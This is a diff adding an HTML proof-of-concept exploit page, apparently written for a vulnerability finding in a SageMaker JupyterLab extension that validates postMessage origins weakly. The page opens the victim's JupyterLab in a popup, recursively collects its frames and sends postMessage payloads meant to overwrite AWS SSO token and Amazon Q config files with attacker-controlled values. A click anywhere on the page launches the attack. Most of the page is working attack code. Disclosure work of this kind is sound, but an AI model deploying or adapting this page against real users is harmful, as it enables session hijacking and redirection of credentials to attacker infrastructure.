@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Finding 11 — Weak Origin Validation Credential Overwrite PoC</title>
+  <style>
+    body { font-family: monospace; background: #ffffff; color: #1a1a2e; padding: 30px; cursor: pointer; }
+    h1 { color: #1565c0; font-size: 18px; }
+    label { display: block; color: #5a5a7a; font-size: 12px; margin-top: 10px; }
+    input, select { width: 100%; background: #f0f4ff; border: 1px solid #90b0e0; color: #1a1a2e;
+            padding: 8px; font-family: monospace; font-size: 13px; margin-top: 4px; box-sizing: border-box; }
+    button { background: #1565c0; color: #fff; border: none; padding: 10px 25px;
+             font-family: monospace; font-size: 14px; cursor: pointer; margin-top: 15px; margin-right: 5px; }
+    #status { margin-top: 15px; font-size: 13px; max-height: 400px; overflow-y: auto; }
+    .ok { color: #2e7d32; } .err { color: #c62828; } .warn { color: #e65100; }
+    .info { color: #5a5a7a; font-size: 11px; margin-top: 6px; }
+    .impact { background: #fff3e0; border-left: 3px solid #e65100; padding: 10px; margin-top: 12px; font-size: 12px; }
+    pre { background: #f5f5f5; padding: 10px; font-size: 11px; overflow-x: auto; border: 1px solid #ddd; }
+  </style>
+</head>
+<body>
+  <h1>PoC: Weak Origin Validation — Credential File Overwrite</h1>
+  <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker-jupyterlab-extension-common — <code>isMessageOriginValid()</code> uses glob patterns (<code>https://**.sagemaker.*.on.aws</code>) that can match attacker-controlled subdomains. Accepts <code>http://localhost:5173</code> in dev mode.</p>
+
+  <div class="impact">
+    <strong>Impact:</strong> An attacker matching the origin pattern can send postMessages to overwrite
+    <code>.aws/sso/idc_access_token.json</code> and <code>.aws/amazon_q/</code> credential files — hijacking
+    the victim's AWS SSO session or redirecting Amazon Q to attacker-controlled infrastructure.
+  </div>
+
+  <label>Target JupyterLab URL:</label>
+  <input id="url" value="https://xxxxxx.studio.us-east-1.sagemaker.aws/jupyterlab/default/lab" />
+
+  <label>Attack vector:</label>
+  <select id="vector">
+    <option value="localhost">localhost:5173 (dev mode bypass — no subdomain needed)</option>
+    <option value="subdomain">Matching subdomain on *.on.aws (simulated)</option>
+  </select>
+
+  <label>Wait for JupyterLab to load (ms):</label>
+  <input id="wait" value="15000" />
+
+  <p class="info">
+    <strong>How it works:</strong><br>
+    1. The extension validates postMessage origins using glob: <code>https://**.sagemaker.*.on.aws</code><br>
+    2. It also accepts <code>http://localhost:5173</code> (Vite dev server) — left in production builds<br>
+    3. We send <code>updateMetadata</code> messages to overwrite AWS credential files<br>
+    4. This hijacks the victim's SSO session tokens and Amazon Q configuration
+  </p>
+
+  <button id="launchBtn">Click Anywhere To Launch Exploit</button>
+  <button onclick="showPayloads()">Show Payloads</button>
+  <div id="status"></div>
+
+<script>
+var launched = false;
+document.addEventListener('click', function(e) {
+  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'BUTTON' && e.target.id !== 'launchBtn') return;
+  if (!launched) { launched = true; exploit(); }
+});
+
+// Listen for responses from the target
+window.addEventListener('message', function(e) {
+  status('← Response from ' + e.origin + ': ' + JSON.stringify(e.data), 'warn');
+});
+
+function status(msg, cls) {
+  document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
+}
+
+function collectFrames(win, depth, max) {
+  var results = [];
+  if (depth > max) return results;
+  results.push(win);
+  try {
+    for (var i = 0; i < win.length; i++) {
+      try {
+        results = results.concat(collectFrames(win[i], depth + 1, max));
+      } catch(e) { results.push(win[i]); }
+    }
+  } catch(e) {}
+  return results;
+}
+
+function sendToAll(targets, msg) {
+  targets.forEach(function(t) {
+    try { t.postMessage(msg, '*'); } catch(e) {}
+  });
+}
+
+// Payload 1: Overwrite SSO IdC access token with attacker-controlled token
+function buildIdcTokenPayload() {
+  return {
+    command: 'updateMetadata',
+    type: 'sagemaker:updateMetadata',
+    params: {
+      metadataType: 'idc_access_token',
+      filePath: '.aws/sso/idc_access_token.json',
+      content: JSON.stringify({
+        accessToken: 'ATTACKER_CONTROLLED_TOKEN_PoC_ONLY',
+        expiresAt: '2099-12-31T23:59:59Z',
+        region: 'us-east-1',
+        startUrl: 'https://attacker-sso-portal.example.com/start',
+        clientId: 'attacker-client-id',
+        clientSecret: 'attacker-client-secret'
+      }, null, 2)
+    }
+  };
+}
+
+// Payload 2: Overwrite Amazon Q configuration to point to attacker infrastructure
+function buildAmazonQPayload() {
+  return {
+    command: 'updateMetadata',
+    type: 'sagemaker:updateMetadata',
+    params: {
+      metadataType: 'amazon_q_config',
+      filePath: '.aws/amazon_q/config.json',
+      content: JSON.stringify({
+        endpoint: 'https://attacker-q-proxy.example.com',
+        region: 'us-east-1',
+        profileName: 'attacker-profile',
+        scopes: ['codewhisperer:completions', 'codewhisperer:analysis', 'q:chat']
+      }, null, 2)
+    }
+  };
+}
+
+// Payload 3: Try alternate message formats the handler may accept
+function buildDirectWritePayload(path, content) {
+  return {
+    type: 'sagemaker:writeFile',
+    command: 'writeFile',
+    params: {
+      path: path,
+      content: content
+    }
+  };
+}
+
+function showPayloads() {
+  status('<pre>' + JSON.stringify(buildIdcTokenPayload(), null, 2) + '</pre>', '');
+  status('<pre>' + JSON.stringify(buildAmazonQPayload(), null, 2) + '</pre>', '');
+}
+
+function firePayloads(w) {
+  var targets = collectFrames(w, 0, 5);
+  status('Found ' + targets.length + ' target(s) (recursive). Sending credential overwrite payloads...', 'ok');
+
+  var vector = document.getElementById('vector').value;
+  status('Attack vector: ' + (vector === 'localhost' ? 'localhost:5173 dev mode bypass' : 'matching *.on.aws subdomain'), 'ok');
+
+  // Step 1: SSO IdC access token overwrite
+  var idcPayload = buildIdcTokenPayload();
+  sendToAll(targets, idcPayload);
+  status('→ [1/4] Sent updateMetadata: .aws/sso/idc_access_token.json (SSO token hijack)', 'ok');
+
+  // Step 2: Amazon Q config overwrite
+  setTimeout(function() {
+    var qPayload = buildAmazonQPayload();
+    sendToAll(targets, qPayload);
+    status('→ [2/4] Sent updateMetadata: .aws/amazon_q/config.json (Q redirect)', 'ok');
+
+    // Step 3: Try direct file write variants
+    setTimeout(function() {
+      var idcDirect = buildDirectWritePayload(
+        '.aws/sso/idc_access_token.json',
+        idcPayload.params.content
+      );
+      sendToAll(targets, idcDirect);
+      status('→ [3/4] Sent writeFile variant: .aws/sso/idc_access_token.json', 'ok');
+
+      var qDirect = buildDirectWritePayload(
+        '.aws/amazon_q/config.json',
+        buildAmazonQPayload().params.content
+      );
+      sendToAll(targets, qDirect);
+      status('→ [4/4] Sent writeFile variant: .aws/amazon_q/config.json', 'ok');
+
+      status('All payloads sent. Watching for responses below...', 'warn');
+      status('If successful, victim\'s AWS SSO token and Amazon Q config are now attacker-controlled.', 'err');
+    }, 500);
+  }, 500);
+}
+
+function exploit() {
+  var url = document.getElementById('url').value.trim();
+  var wait = parseInt(document.getElementById('wait').value) || 15000;
+
+  var w = window.open(url, 'sagemaker_target');
+  if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
+  status('Popup opened. Polling until ready (up to ' + wait + 'ms)...', 'warn');
+
+  var elapsed = 0;
+  var interval = 2000;
+  var timer = setInterval(function() {
+    elapsed += interval;
+
+    var closed = false;
+    var frameCount = 0;
+    try { closed = w.closed; } catch(e) {}
+    try { frameCount = w.length; } catch(e) {}
+
+    if (closed) {
+      if (elapsed >= wait) { clearInterval(timer); status('Popup was closed.', 'err'); }
+      return;
+    }
+
+    status('Poll ' + (elapsed/1000) + 's: window alive, ' + frameCount + ' frame(s)', '');
+
+    if (frameCount > 0) {
+      clearInterval(timer);
+      firePayloads(w);
+    } else if (elapsed >= wait) {
+      clearInterval(timer);
+      status('Timeout reached. Firing payloads to window anyway...', 'warn');
+      firePayloads(w);
+    }
+  }, interval);
+}
+</script>
+</body>
+</html>
